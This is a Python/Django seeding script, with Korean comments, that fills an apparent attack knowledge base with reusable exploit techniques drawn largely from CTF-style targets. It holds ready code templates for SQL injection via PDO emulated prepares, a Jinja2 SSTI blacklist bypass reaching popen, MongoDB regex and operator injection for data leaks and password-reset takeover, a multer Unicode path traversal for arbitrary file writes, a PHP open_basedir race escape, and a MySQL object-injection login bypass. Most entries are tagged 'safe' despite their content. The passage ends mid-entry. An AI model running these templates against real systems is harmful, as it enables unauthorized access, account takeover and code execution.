"""Exploit technique seed — *문제별 박제가 아니라 transferable trick* 형태.

각 technique은 PayloadPattern (source='technique') 한 행 + attack_metadata에 표준 schema.
schema 정의/추가 가이드는 agent/eval/KB_SCHEMA.md.

사용:
  docker compose exec backend python manage.py seed_techniques
  docker compose exec backend python manage.py seed_techniques --reset
"""
from __future__ import annotations

from django.core.management.base import BaseCommand
from django.db import transaction

from api.embedding_service import (
    EMBEDDING_MODEL,
    embed_documents,
    is_available as embeddings_available,
)
from api.models import PayloadPattern, VulnerabilityEntry


# ── Technique 정의 ────────────────────────────────────────────
# 각 entry = 하나의 일반화된 trick.
# attack_metadata schema (KB_SCHEMA.md의 표준):
#   {
#     "kind": "exploit_technique",
#     "name": str,                    # human-readable
#     "applies_when": str,             # 코드/응답에서 어떤 조건 보이면 적용 가능
#     "prerequisites": [str, ...],     # 필요 조건 리스트
#     "technique_steps_md": str,       # markdown step-by-step
#     "code_template": str,            # parametrized payload template
#     "examples": [                    # known applications
#       {"params": {...}, "notes": str}
#     ],
#     "tags": [str, ...],
#   }

TECHNIQUES: list[dict] = [
    {
        "name": "exif_passthrough_marker",
        "vuln_type": "file_upload_quirk",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["exif", "image", "passthrough", "marker"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "EXIF passthrough — binary marker + JSON payload",
            "applies_when": (
                "서버가 업로드된 JPEG의 EXIF에서 `b\"<MARKER>\\x00\"` 같은 magic byte를 검색하고 "
                "그 다음 바이트를 JSON으로 parse하는 경우 (metadata 검사 류 모든 문제)"
            ),
            "prerequisites": [
                "서버가 piexif/PIL로 EXIF 처리 — 표준 EXIF tag만 dump",
                "raw bytes append (img.info['exif']) 는 PIL save에서 떨어짐",
                "MakerNote(0x927C) 또는 UserComment(0x9286) 는 Exif IFD 표준 자유 binary tag",
            ],
            "technique_steps_md": (
                "1. piexif.load(image_exif) → exif_dict\n"
                "2. exif_dict['Exif'][piexif.ExifIFD.MakerNote] = b'<MARKER>\\x00<JSON>'\n"
                "   또는 piexif.ExifIFD.UserComment 사용 (둘 다 자유 binary)\n"
                "3. piexif.dump(exif_dict) → exif_bytes\n"
                "4. img.save(out, format='JPEG', exif=exif_bytes)\n"
                "5. 서버는 exif_data.find(b'<MARKER>\\x00') + len → JSON parse 통과"
            ),
            "code_template": (
                "import io, piexif\n"
                "from PIL import Image\n"
                "img = Image.new('RGB', (100,100), {color})\n"
                "buf = io.BytesIO(); img.save(buf, format='JPEG')\n"
                "exif_dict = piexif.load(buf.getvalue())\n"
                "exif_dict['Exif'][piexif.ExifIFD.MakerNote] = b'{marker}\\x00' + {json_bytes}\n"
                "out = io.BytesIO()\n"
                "Image.open(io.BytesIO(buf.getvalue())).save(out, format='JPEG',\n"
                "                                            exif=piexif.dump(exif_dict))"
            ),
            "examples": [
                {
                    "params": {
                        "marker": "CUSTOM_MARKER",
                        "json_bytes": "b'{}'",
                        "tag_used": "MakerNote",
                    },
                    "notes": (
                        "UserComment / MakerNote 둘 다 동일 효과 — 서버 verify는 "
                        "img.info['exif'] 전체 bytes에서 marker 검색."
                    ),
                },
            ],
            "tags": ["exif", "passthrough", "image_upload"],
        },
    },
    {
        "name": "pdo_emulate_prepare_question_mark_smuggling",
        "vuln_type": "sqli",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["sqli", "pdo", "emulate-prepare", "identifier-injection"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "PDO emulate-prepare `?` smuggling — column/identifier injection",
            "applies_when": (
                "PHP PDO MySQL backend가 emulate prepare 모드(default `PDO::ATTR_EMULATE_PREPARES=true`)"
                "이고, prepared statement의 SQL string 일부에 사용자 입력이 동적 concat되어 추가 `?` "
                "토큰을 만들 수 있는 경우. 정상적으로 column/identifier/table name 위치에 입력이 "
                "들어가지만, 그 안에 `?` 한 개를 박으면 client-side prepare가 다른 placeholder로 인식 "
                "→ WHERE 절의 `?` 가 unbound로 밀려나고 우리 입력이 그 자리로 들어감."
            ),
            "prerequisites": [
                "PDO + MySQL (다른 backend에서는 server-side prepare로 무효)",
                "ATTR_EMULATE_PREPARES=true (PDO MySQL 기본값)",
                "동적 concat된 부분이 backtick으로 감싸지지 않거나, 감싸졌어도 input이 backtick 포함",
                "execute([single_value]) 같이 placeholder 1개만 바인드하는 호출 패턴",
            ],
            "technique_steps_md": (
                "1. 식별: `prepare(\"SELECT $col_param FROM t WHERE x = ?\"); execute([input])` 패턴\n"
                "2. col_param 에 `\\?#\\x00` 같은 가짜 column name + `?` + comment + null byte 박음\n"
                "   → SQL: `SELECT \\?#\\0 FROM t WHERE x = ?` (총 ? 2개)\n"
                "3. PDO emulate prepare가 첫 `?` 를 input 으로 string 치환:\n"
                "   `SELECT \\<input_value>#\\0 FROM t WHERE x = ?`\n"
                "4. input 안에 backtick 으로 column 닫고 임의 SELECT subquery 삽입 + `;#` 으로 뒤 SQL 주석 처리\n"
                "5. response: 결과를 column-display 안 거치고 `array_values($row)` (CSV/JSON dump) 로 받기"
            ),
            "code_template": (
                "import requests\n"
                "s = requests.Session()\n"
                "s.post(f'{TARGET}/login.php', data={{'username': USER, 'password': PW}})\n"
                "r = s.get(f'{TARGET}/index.php', params={{\n"
                "    'col': '\\\\?#\\x00',\n"
                "    'name': \"x` FROM (SELECT {leak_column} AS `'x` FROM {leak_table})y;#\",\n"
                "    'download': '1',  # array_values dump 가 가장 robust\n"
                "}})\nprint(r.text)  # CSV: 한 줄당 한 row"
            ),
            "examples": [
                {
                    "params": {
                        "leak_column": "password",
                        "leak_table": "users",
                        "post_exploit": "admin login → 추가 공격 체인 가능",
                    },
                    "notes": (
                        "ref: slcyber.io PDO 연구. CSV download 옵션이 column-name 매핑 우회에 유용 — "
                        "displayColumns 가 colParam 로만 결정되므로 HTML table은 `-` 로 표시되지만 "
                        "?download=1 의 array_values 는 실제 SELECT 결과를 그대로 dump."
                    ),
                },
            ],
            "tags": ["sqli", "pdo", "emulate-prepare", "identifier-injection"],
        },
    },
    {
        "name": "safe_eval_attribute_chain",
        "vuln_type": "code_injection",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["eval", "ssti", "attribute-chain", "filter-bypass"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "safe_eval / Jinja2 attribute chain — filter bypass",
            "applies_when": (
                "사용자 입력이 eval() / safe_eval() / render_template_string() 같은 sink에 전달되며 "
                "allowed_globals 또는 Jinja2 환경에 os/__builtins__/__class__/__mro__ 류가 노출. "
                "BLACKLIST 필터(`(`, `)`, `__`, `os`, `import` 등)가 있어도 attribute access "
                "(`a.b.c`), Jinja2 `attr()` filter, `~` 문자열 결합, 표준 dict access로 우회 가능."
            ),
            "prerequisites": [
                "input이 attribute access (`a.b`) 형태 가능한 sink",
                "결과가 응답 본문/error/debug에 노출되거나 또는 side-effect (file read, OOB) 가능",
                "필터 우회: '(' 차단 시 dict comprehension 또는 standard data access "
                "(`os.environ`, `request.application.__globals__`)",
                "Jinja2의 경우 `cycler|attr('_'~'_'~'init'~'_'~'_')|attr('_'~'_'~'globals'~'_'~'_')` 식 chain",
            ],
            "technique_steps_md": (
                "1. sink 식별: `eval(value)`, `safe_eval(value)`, `{{ value }}` (Jinja2 SSTI)\n"
                "2. allowed_globals/builtins/class chain 매핑:\n"
                "   - Python eval: `os.environ` (가장 단순), `__builtins__.eval`, "
                "`().__class__.__mro__[1].__subclasses__()`\n"
                "   - Jinja2: `cycler|attr('__init__')|attr('__globals__')|...` 또는 "
                "`config.from_object`, `request.application.__globals__`\n"
                "3. 필터 통과: '(' 금지면 dict access — `os.environ` 자체가 dict이므로 호출 불필요\n"
                "4. 출력: 응답 body의 debug/error/template render 결과에서 추출"
            ),
            "code_template": (
                "# Python eval/safe_eval\n"
                "payload = {expr}  # 예: 'os.environ'\n\n"
                "# Jinja2 SSTI BLACKLIST 우회\n"
                "payload = '{{ cycler|attr(\"_~_~init~_~_\".replace(\"~\",\"\"))'\n"
                "          '|attr(\"_~_~globals~_~_\".replace(\"~\",\"\"))'\n"
                "          '|attr(\"get\")(\"o~s\".replace(\"~\",\"\"))'\n"
                "          '|attr(\"po~pen\".replace(\"~\",\"\"))(\"<cmd>\")'\n"
                "          '|attr(\"re~ad\".replace(\"~\",\"\"))() }}'"
            ),
            "examples": [
                {
                    "params": {
                        "sink": "safe_eval (Python)",
                        "expr": "os.environ",
                        "filter_bypassed": ["( 차단", ") 차단", "domain regex 통과 필요"],
                        "output_path": "TRACE /verify response debug field",
                    },
                    "notes": "ImageDescription tag → safe_eval → dict(os.environ) → FLAG env 노출",
                },
                {
                    "transferable_verified": True,
                    "params": {
                        "sink": "Jinja2 render_template_string",
                        "expr": "cycler|attr('_'~'_'~'init'~'_'~'_')|attr(...)|attr('po'~'pen')",
                        "bypass_chars": "~ (concat, + 차단), attr() (. [] 차단), 'o'~'s' (os 차단)",
                        "filter_bypassed": [
                            "BLACKLIST: __ . [ ] + request config os subprocess "
                            "import init globals open read mro class",
                        ],
                        "output_path": "bash `case $(cat /flag|cut -c N) in C) sleep 4 ;; esac` "
                                       "→ POST /write 응답 시간 (selenium bot block until /article load)",
                        "verified_signal": "baseline 2.45s, sleep trigger 5.37s, threshold 4.85s",
                    },
                    "notes": (
                        "OOB 불가 (iptables outgoing DROP). transferable 증명 — "
                        "Python eval 패턴이 Jinja2 SSTI 변형으로 그대로 적용."
                    ),
                },
            ],
            "tags": ["eval", "ssti", "attribute-chain", "filter-bypass"],
        },
    },
    {
        "name": "dyson_multi_request_host_smuggling",
        "vuln_type": "ssrf_loopback_bypass",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["ssrf", "host-header", "multi-request", "ip-bypass"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "multiRequest Host-header loopback smuggling",
            "applies_when": (
                "Node 서버가 내부적으로 request 를 fan-out 할 때 hostname/port 를 "
                "클라이언트가 보낸 Host 헤더에서 파싱하는 경우. "
                "multiRequest 기능 (path fragment 에 ',' 포함 시 split 후 http.get) 에서 "
                "`req.headers.host.split(':')` 로 target 결정. 이때 Host: localhost:port 로 "
                "보내면 서버가 자기 자신에게 loopback 요청 → req.socket.remoteAddress=127.0.0.1."
            ),
            "prerequisites": [
                "서버 코드가 `req.socket.remoteAddress` 로 IP 체크 (127.0.0.1 whitelist 등)",
                "dyson-generators 류 또는 유사하게 Host 헤더 기반 내부 redirect 가능",
                "route 가 multiRequest middleware 경유",
                "multiRequest delimiter (기본 ',') 알려져 있음",
            ],
            "technique_steps_md": (
                "1. 서버 코드에서 IP 체크 / internal-only 엔드포인트 식별.\n"
                "2. 동일 서버의 route 중 multiRequest 지원 middleware 경유하는 것 찾기 "
                "(dyson-generators 류는 모든 route 기본 지원).\n"
                "3. URL path 에 ',' 포함한 fragment 삽입 — fragment 를 split 후 각 id 로 "
                "path.replace(arr, id) 해서 loopback http.get.\n"
                "4. **Host 헤더를 `localhost:<internal_port>` 로 설정** — 서버가 자기 자신에게 "
                "내부 요청. 그 요청의 remoteAddress = 127.0.0.1.\n"
                "5. 반드시 적어도 한 sub-request url 이 target route 에 매치되도록 "
                "`,` 양쪽 조각이 유효 path 가 되게 배치. query string 전달은 `?` 사이에 끼워 "
                "넣기 (예: `/api/X?guess=V&extra,X?guess=V`).\n"
            ),
            "code_template": (
                "# url template: /<route>?<params>&<pad>,<route_tail>?<params>\n"
                "# Host header must be 'localhost:<internal_port>'\n"
                "import urllib.request\n"
                "req = urllib.request.Request(\n"
                "    'http://<target>/<route>?<params>&extra,<route_tail>?<params>',\n"
                "    headers={'Host': 'localhost:<internal_port>'},\n"
                ")\n"
                "r = urllib.request.urlopen(req, timeout=10)\n"
            ),
            "examples": [
                {
                    "params": {
                        "route": "/api/protectedService",
                        "payload_path": (
                            "/api/protectedService?param=val&extra,protectedService?param=val"
                        ),
                        "host_header": "localhost:3000",
                        "internal_port": 3000,
                        "bypass_target": "req.socket.remoteAddress == 127.0.0.1 check",
                    },
                    "notes": (
                        "multiRequest: path fragment with ',' → range.split(',') → each "
                        "id path.replace → http.get({hostname, port from Host header, path}). "
                        "Host=localhost:3000 → backend loops back to itself, inner handler sees "
                        "remoteAddress=127.0.0.1."
                    ),
                },
            ],
            "tags": ["ssrf", "host-header", "loopback", "ip-bypass"],
        },
    },
    {
        "name": "js_asi_const_overwrite",
        "vuln_type": "js_parser_quirk",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["javascript", "asi", "const", "parser-quirk", "nodejs"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "JS Automatic Semicolon Insertion — const literal overwrite",
            "applies_when": (
                "JavaScript 소스에서 `const X = \"<value>\"` 뒤에 세미콜론 없이 다음 줄이 "
                "`[a, b] = expr` 로 시작하는 경우. ASI 는 string literal 다음에 오는 `[` 를 "
                "member-access 로 해석해서 세미콜론 삽입 안 함 → 전체가 `const X = \"...\"[a,b] = expr` "
                "한 statement 로 파싱. comma expression `[a,b]` 는 `b` 평가 → "
                "`\"...\"[b] = expr` 은 string prop 할당 (sloppy mode silent fail), 할당식 값=expr. "
                "결국 `const X = expr` — 공격자 제어 값으로 const 를 덮어씀."
            ),
            "prerequisites": [
                "분석 가능한 JS 소스 (blackbox 에서는 어려움, 단 소스 유출/writeup 시)",
                "선언부: `const X = \"literal\"` 뒤에 세미콜론 누락",
                "바로 다음 줄: `[var1, var2] = <attacker_controlled_expr>`",
                "sloppy mode (엄격 모드면 TypeError — strict 가 아니어야 함)",
                "후속 비교: `X == something` 에서 공격자가 expr 값을 양쪽 중 하나와 같게 만들 수 있음",
            ],
            "technique_steps_md": (
                "1. JS 소스에서 `const ... = \"...\"` 뒤 세미콜론 빠진 줄 검색.\n"
                "2. 다음 줄이 `[...] = <expr>` 패턴이면 `X` 가 expr 로 덮어쓰기됨.\n"
                "3. 비교 문 (`if (X == target)`) 확인 — target 이 공격자 제어 expr 결과와 "
                "같게 만들면 체크 우회.\n"
                "4. JS 동등 비교 (`==`) 의 coercion 활용 — 예: `[\"0000\"] == false` → "
                "array→string `\"0000\"` → number `0` ↔ `false` → `0` → true.\n"
                "5. expr 소스 (req.query, req.body 등) 에 payload 주입.\n"
            ),
            "code_template": (
                "// vulnerable source pattern:\n"
                "//   const TARGET = \"...\"\n"
                "//   [a, b] = req.query.X !== undefined ? atob(req.query.X).split(\"|\") : [...]\n"
                "// attacker sends X=<base64> such that after atob+split, compared value == initial false/0/null.\n"
                "// example: X=MDAwMA== (atob=\"0000\") → TARGET=[\"0000\"] → [\"0000\"] == false → 0==0 → true\n"
            ),
            "examples": [
                {
                    "params": {
                        "guess": "MDAwMA==",
                        "atob_decoded": "0000",
                        "final_compare": "[\"0000\"] == false  -> \"0000\" == 0 -> true",
                        "overwritten_const": "SecretVariable",
                    },
                    "notes": (
                        "const SecretVariable = \"[REDACTED]\"\\n[param1, param2] = "
                        "req.query.guess !== undefined ? atob(req.query.guess).split(\"|\") : [...] "
                        "→ ASI 실패로 한 문장. 공격자가 guess 제어 → SecretVariable 자체가 "
                        "array 로 덮어짐. 비교 피연산자가 false(초기값) 이므로 array→0 coercion 으로 매치."
                    ),
                },
            ],
            "tags": ["javascript", "asi", "const", "type-coercion", "nodejs"],
        },
    },
    # ── NoSQL / path traversal techniques ──
    {
        "name": "mongodb_regexp_injection_email_leak",
        "vuln_type": "nosql_injection",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["nosql", "mongodb", "regex", "regexp-injection", "brute-force", "email-leak"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "MongoDB RegExp injection — character-by-character data leak",
            "applies_when": (
                "서버가 사용자 입력을 sanitize 없이 `new RegExp(input)` 으로 변환하여 "
                "MongoDB `findOne({field: regex})` 등에 사용하는 경우. 공격자가 regex 메타문자 "
                "(`^`, `.*`, `$`, `[a-z]` 등)를 삽입하여 존재하는 데이터를 한 글자씩 brute-force. "
                "전형적으로 registration duplicate check, search, login 등에서 발견."
            ),
            "prerequisites": [
                "사용자 입력이 `new RegExp()` 또는 `{$regex: input}` 에 직접 전달",
                "결과가 존재/미존재를 구분 가능한 응답 차이 (400 'exists' vs 200 'ok' 등)",
                "brute-force 가능한 응답 속도 (rate limiting 미적용 또는 느슨)",
            ],
            "technique_steps_md": (
                "1. 대상 필드에 regex 메타문자가 동작하는지 확인: `^a.*` 전송 → 기존 데이터 매치 여부\n"
                "2. 한 글자씩 접두사 확장: `^guide_a.*`, `^guide_ab.*`, ... → 존재 응답이면 해당 글자 확정\n"
                "3. 더 이상 매치되는 글자가 없으면 해당 접두사가 전체 값\n"
                "4. 특수문자 처리: regex 메타문자 (`$`, `*`, `+` 등)는 character class `[$]`, `[*]` 로 escape\n"
                "5. 추출된 값(이메일, 토큰 등)을 다음 공격 단계에 활용"
            ),
            "code_template": (
                "import string, requests\n"
                "url = f'{TARGET}/api/auth/register'\n"
                "charset = list(string.ascii_lowercase + string.digits)\n"
                "prefixes = ['^{known_prefix}']\n"
                "while prefixes:\n"
                "    nxt = []\n"
                "    for pfx in prefixes:\n"
                "        for ch in charset:\n"
                "            r = requests.post(url, json={{'email': f'{{pfx}}{{ch}}.*', 'username': ''}})\n"
                "            if '{exists_indicator}' in r.text:\n"
                "                nxt.append(pfx + ch)\n"
                "    prefixes = nxt\n"
                "# prefixes 에 없으면 마지막 prefix 가 전체 값"
            ),
            "examples": [
                {
                    "params": {
                        "field": "email",
                        "endpoint": "POST /api/auth/register",
                        "server_code": "User.findOne({email: new RegExp(['^', String(email), '$'].join(''), 'i')})",
                        "exists_indicator": "User already exists",
                        "charset": "a-z0-9",
                    },
                    "notes": (
                        "registration duplicate check에서 email이 RegExp으로 변환됨. "
                        "prefix 체크를 `^prefix_` 로 우회 — "
                        "서버가 `'^' + '^prefix_a.*' + '$'` = `^^prefix_a.*$` 으로 만들어도 "
                        "JS regex에서 `^^` 는 `^` 와 동일."
                    ),
                },
            ],
            "tags": ["nosql", "mongodb", "regex", "brute-force"],
        },
    },
    {
        "name": "nosql_operator_injection_token_bypass",
        "vuln_type": "nosql_injection",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["nosql", "mongodb", "operator-injection", "password-reset", "auth-bypass"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "MongoDB operator injection ($ne/$gt/$regex) — auth/token bypass",
            "applies_when": (
                "Express/Node 서버에서 `req.body` 를 JSON으로 파싱한 뒤, 그 값을 직접 "
                "MongoDB query (`findOne({field: value})`)에 전달하는 경우. "
                "`bodyParser.json()` 이 object/array도 파싱하므로 `{\"field\": {\"$ne\": null}}` "
                "전송 시 `findOne({field: {$ne: null}})` → token/password/secret 이 null이 "
                "아닌 모든 document 매치. password reset, API key 검증, 2FA token 체크 등에 적용."
            ),
            "prerequisites": [
                "Express bodyParser.json() 또는 유사 JSON body parser 사용",
                "req.body 값이 sanitize 없이 MongoDB query에 전달",
                "대상 필드에 non-null 값이 존재하는 document가 DB에 있음",
                "Mongoose의 SchemaType validation이 String으로 제한되지 않거나 우회 가능",
            ],
            "technique_steps_md": (
                "1. password reset 등에서 token/code 를 body로 보내는 API 식별\n"
                "2. 먼저 정상 flow로 대상 계정에 token 생성 요청 (예: email 전송)\n"
                "3. token 필드에 `{\"$ne\": null}` 전송 → 해당 token이 존재하는 아무 user 매치\n"
                "   변형: `{\"$gt\": \"\"}` (빈 문자열보다 큰 모든 값), `{\"$regex\": \".*\"}` (모든 값)\n"
                "4. 매치된 user에 대해 password 변경 / 2FA 우회 / 세션 탈취\n"
                "5. 변경된 credential로 로그인"
            ),
            "code_template": (
                "import requests\n"
                "# Step 1: generate reset token for target\n"
                "requests.post(f'{TARGET}/api/auth/reset',\n"
                "              json={{'email': '{target_email}', 'sendMail': False}})\n"
                "# Step 2: bypass token with $ne operator\n"
                "r = requests.post(f'{TARGET}/api/auth/reset',\n"
                "                  json={{'token': {{'$ne': None}}, 'password': '{new_password}'}})\n"
                "# Step 3: login with new password\n"
                "s = requests.Session()\n"
                "s.post(f'{TARGET}/api/auth/login',\n"
                "       json={{'email': '{target_email}', 'password': '{new_password}'}})"
            ),
            "examples": [
                {
                    "params": {
                        "endpoint": "POST /api/auth/reset",
                        "vulnerable_code": "User.findOne({resetPassToken: token})",
                        "payload": '{"token": {"$ne": null}, "password": "newpw"}',
                        "target_role": "privileged user",
                    },
                    "notes": (
                        "resetPassword flow: (1) email→generateToken → sets resetPassToken, "
                        "(2) token→sendResetPassword → User.findOne({resetPassToken: token}). "
                        "sendMail=false 면 메일 안 보내도 token 생성됨. "
                        "$ne:null 로 token 존재하는 아무 user 매치 → 비번 리셋."
                    ),
                },
            ],
            "tags": ["nosql", "mongodb", "operator-injection", "auth-bypass"],
        },
    },
    {
        "name": "multer_unicode_path_traversal",
        "vuln_type": "path_traversal",
        "category": "exploitation",
        "safety_level": "dangerous",
        "tags": ["path-traversal", "multer", "unicode", "file-upload", "nodejs", "encoding"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "Multer latin1→utf8 Unicode path traversal (丯 = /)",
            "applies_when": (
                "Express + multer 파일 업로드에서 filename을 `Buffer.from(name, 'latin1').toString('utf-8')` "
                "로 변환하고, 결과를 `diskStorage` 의 filename callback에 그대로 사용하는 경우. "
                "RFC5987 `filename*=UTF-8''...` 인코딩으로 Unicode 문자 `丯` (U+4E2F, UTF-8: E4 B8 AF) "
                "를 보내면, latin1→utf8 변환 후 OS 경로에서 `/` 로 해석되어 업로드 디렉터리 탈출."
            ),
            "prerequisites": [
                "multer diskStorage 사용 (메모리 스토리지는 파일 안 씀)",
                "filename callback이 `file.originalname` 을 path.basename() 없이 그대로 사용",
                "latin1→utf8 변환 로직 존재 (일부 multer 설정에서 CJK filename 지원용으로 추가)",
                "guide/admin 등 업로드 권한이 있는 계정 필요 (별도 auth bypass와 조합)",
            ],
            "technique_steps_md": (
                "1. 업로드 엔드포인트와 multer 설정 확인 (diskStorage + filename callback)\n"
                "2. `Buffer.from(name, 'latin1').toString('utf-8')` 변환 여부 확인\n"
                "3. multipart form에 RFC5987 encoding 사용:\n"
                "   `Content-Disposition: form-data; name=\"image\"; filename*=UTF-8''..%E4%B8%AF..%E4%B8%AF...target`\n"
                "   `..丯` = `../` 에 해당 (丯 의 UTF-8 E4 B8 AF → latin1 해석 → utf8 → `/`)\n"
                "4. traversal depth: `..丯` 를 충분히 반복하여 root까지 탈출 (13회 정도)\n"
                "5. 타겟 경로 (예: `/proc/self/fd/N`, `/tmp/exploit.sh`) 에 payload 기록\n"
                "6. 후속: /proc/self/fd/ 로 Node process 메모리 조작 (ROP) 또는 cron/script 덮어쓰기"
            ),
            "code_template": (
                "from urllib.parse import quote\n"
                "import requests\n\n"
                "traversal = '..丯' * 13 + '{target_path}'.replace('/', '丯')\n"
                "fn_rfc = \"UTF-8''\" + quote(traversal)\n"
                "boundary = '----Exploit'\n"
                "body = f'--{{boundary}}\\r\\n'\n"
                "body += f'Content-Disposition: form-data; name=\"image\"; filename*={{fn_rfc}}\\r\\n'\n"
                "body += 'Content-Type: application/octet-stream\\r\\n\\r\\n'\n"
                "body = body.encode('utf-8') + {payload_bytes} + f'\\r\\n--{{boundary}}--\\r\\n'.encode('utf-8')\n"
                "r = session.put(f'{{TARGET}}/api/answers/{{uuid}}', data=body,\n"
                "                headers={{'Content-Type': f'multipart/form-data; boundary={{boundary}}'}})"
            ),
            "examples": [
                {
                    "params": {
                        "endpoint": "PUT /api/answers/:uuid (multer upload.single('image'))",
                        "encoding_line": "file.originalname = Buffer.from(file.originalname, 'latin1').toString('utf-8')",
                        "unicode_char": "丯 (U+4E2F)",
                        "traversal_target": "/proc/self/fd/N (ROP) 또는 /tmp/ (arbitrary write)",
                    },
                    "notes": (
                        "auth bypass로 권한 획득 후, multer 업로드로 path traversal. "
                        "ROP payload를 /proc/self/fd/에 쓰면 Node process crash → execve 가능."
                    ),
                },
            ],
            "tags": ["path-traversal", "multer", "unicode", "file-upload", "encoding"],
        },
    },
    # ── PHP sandbox escape technique ──
    {
        "name": "php_open_basedir_race_pcntl_fork",
        "vuln_type": "open_basedir_bypass",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["php", "open-basedir", "race-condition", "pcntl-fork", "lfi", "sandbox-escape"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "PHP open_basedir bypass — pcntl_fork + rename race on getcwd/MAXPATHLEN",
            "applies_when": (
                "PHP 8.x 환경에서 `open_basedir`이 `/tmp` 등으로 제한되어 있고, "
                "`disable_functions`에 `pcntl_fork`가 빠져있으며 (pcntl extension 활성), "
                "임의 PHP 코드 실행이 가능한 경우 (eval gate, 웹셸, 파일 업로드 등). "
                "system/exec/popen 등 명령 실행 함수가 차단되어도 `file_get_contents`로 "
                "open_basedir 밖의 `/flag.txt` 등을 읽을 수 있음."
            ),
            "prerequisites": [
                "임의 PHP 코드 실행 가능 (eval, include, etc.)",
                "pcntl_fork()가 disable_functions에서 제외됨",
                "open_basedir이 /tmp을 포함 (mkdir/rename 가능해야 함)",
                "ini_set('open_basedir', ...) 호출 가능 (php_admin_value가 아닌 경우)",
            ],
            "technique_steps_md": (
                "1. `chdir('/tmp')` → `mkdir('start/')` → `chdir('start/')`\n"
                "2. `str_repeat('a' * 249 . '/', N)` 으로 경로 길이가 4096(MAXPATHLEN) 직전이 되는 "
                "깊은 디렉터리 생성 후 `chdir`\n"
                "3. `pcntl_fork()` — child와 parent로 분기\n"
                "4. **Child**: 반복적으로 `ini_set('open_basedir', $cur . ':../')` 시도. "
                "parent가 rename으로 경로를 4096 이상으로 만들면 `getcwd()` 실패 → "
                "`expand_filepath('../')` 가 `VCWD_OPEN('../')` fallback → `../` 그대로 반환 → "
                "open_basedir에 `../` 추가 성공\n"
                "5. **Parent**: `/tmp/start`를 `/tmp/xxxxxx...(250자)`로 rename ↔ 원복 반복 "
                "(경로 길이를 4096 경계에서 토글)\n"
                "6. Child: race 성공 후 `chdir('/tmp'); chdir('../')` → open_basedir 탈출\n"
                "7. `file_get_contents('/flag.txt')` 로 flag 읽기"
            ),
            "code_template": (
                "chdir('/tmp');\n"
                "@mkdir('start/');\n"
                "chdir('start/');\n"
                "$cur_dir_len = strlen(getcwd());\n"
                "$depth = str_repeat(str_repeat('a', 249).'/', 16 - floor($cur_dir_len / 250));\n"
                "@mkdir($depth, 0755, true);\n"
                "chdir($depth);\n"
                "$pid = pcntl_fork();\n"
                "if($pid == 0) {\n"
                "  for ($i=0; $i<25; $i++) {\n"
                "    usleep(300);\n"
                "    ini_set('open_basedir', ini_get('open_basedir').':../');\n"
                "  }\n"
                "  chdir('/tmp'); chdir('../');\n"
                "  echo file_get_contents('{flag_path}');\n"
                "} else {\n"
                "  chdir('/tmp');\n"
                "  for ($i=0; $i<30000; $i++) {\n"
                "    usleep(30);\n"
                "    @rename('start', str_repeat('x', 250));\n"
                "    @rename(str_repeat('x', 250), 'start');\n"
                "  }\n"
                "}"
            ),
            "examples": [
                {
                    "params": {
                        "open_basedir": "/var/www/html:/tmp",
                        "disabled_functions": "system,exec,shell_exec,popen,proc_open,passthru,... (pcntl_fork 제외)",
                        "flag_path": "/flag.txt",
                        "eval_gate": "?key=KEY&code=<php_code>",
                        "race_success_rate": "첫 시도 성공률 높음",
                    },
                    "notes": (
                        "PHP 8.4-cli 대상. expand_filepath()의 VCWD_GETCWD → getcwd() 가 "
                        "MAXPATHLEN(4096) 초과 시 실패, fallback으로 VCWD_OPEN(filepath)이 "
                        "성공하면 filepath를 realpath로 그대로 반환하는 버그. "
                        "이를 race condition으로 trigger."
                    ),
                },
            ],
            "tags": ["php", "open-basedir", "race-condition", "pcntl-fork", "sandbox-escape"],
        },
    },
    # ── Auth bypass / XSS chain techniques ──
    {
        "name": "mysql_object_injection_auth_bypass",
        "vuln_type": "sqli",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["mysql", "object-injection", "auth-bypass", "type-confusion", "nodejs"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "MySQL object injection auth bypass — JSON object as parameterized query value",
            "applies_when": (
                "Node.js 앱에서 mysql/mysql2 드라이버로 parameterized query를 사용하지만, "
                "사용자 입력(req.body.password 등)의 타입을 검증하지 않아 JSON 객체를 그대로 전달하는 경우. "
                "Express의 express.json() 미들웨어가 활성화되어 있으면 "
                "{ \"password\": { \"password\": 1 } } 같은 중첩 객체가 파싱됨."
            ),
            "prerequisites": [
                "Node.js + mysql/mysql2 드라이버 사용",
                "express.json() 미들웨어 활성 (Content-Type: application/json)",
                "parameterized query에 사용자 입력을 타입 검증 없이 전달",
                "SELECT * FROM users WHERE username = ? AND password = ? 같은 쿼리",
            ],
            "technique_steps_md": (
                "1. 타겟 로그인 엔드포인트 확인: `POST /auth/login` + `Content-Type: application/json`\n"
                "2. 비밀번호 필드에 객체 전달: `{\"username\": \"admin\", \"password\": {\"password\": 1}}`\n"
                "3. mysql2 드라이버가 객체를 `` `password` = 1 ``로 serialize\n"
                "4. 최종 SQL: `WHERE username = 'admin' AND password = \\`password\\` = 1`\n"
                "5. `password = \\`password\\`` → 컬럼 자기 자신 비교 → 항상 1(true)\n"
                "6. `1 = 1` → true → 인증 우회 성공"
            ),
            "code_template": (
                "import requests\n"
                "r = requests.post('{url}/auth/login',\n"
                "    json={'username': '{target_user}', 'password': {'password': 1}})\n"
                "token = r.json().get('token')\n"
                "# token으로 admin 기능 접근 가능"
            ),
            "examples": [
                {
                    "params": {
                        "driver": "mysql2",
                        "query": "SELECT * FROM users WHERE username = ? AND password = ?",
                        "payload": '{"username": "admin", "password": {"password": 1}}',
                    },
                    "notes": (
                        "mysql2 드라이버는 객체를 `col = val` 형태로 직렬화. "
